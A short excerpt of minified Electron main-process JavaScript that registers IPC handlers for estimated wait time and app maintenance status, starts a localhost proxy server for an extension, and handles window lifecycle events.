  }
});

he.ipcMain.handle("app:get-estimated-time", async (event, data) => {
  try {
    // Placeholder: return estimated time based on queue length
    const estimatedMinutes = 5;
    return { success: true, estimatedMinutes };
  } catch (error) {
    console.error("Error getting estimated time:", error);
    return { success: false, error: error.message };
  }
});

he.ipcMain.handle("app:get-status", async () => {
  try {
    const maintenance = await checkMaintenance();
    return {
      success: true,
      status: maintenance ? "maintenance" : "running",
      maintenance: maintenance
    };
  } catch (error) {
    console.error("Error getting app status:", error);
    return { success: false, error: error.message };
  }
});

// Start local proxy server for extension (127.0.0.1:3010)
const localProxy = createLocalProxyServer();
localProxy.listen();

he.app.on("window-all-closed", () => {
  process.platform !== "darwin" && he.app.quit();
});
he.app.on("activate", () => {
  he.BrowserWindow.getAllWindows().length === 0 && nc();
});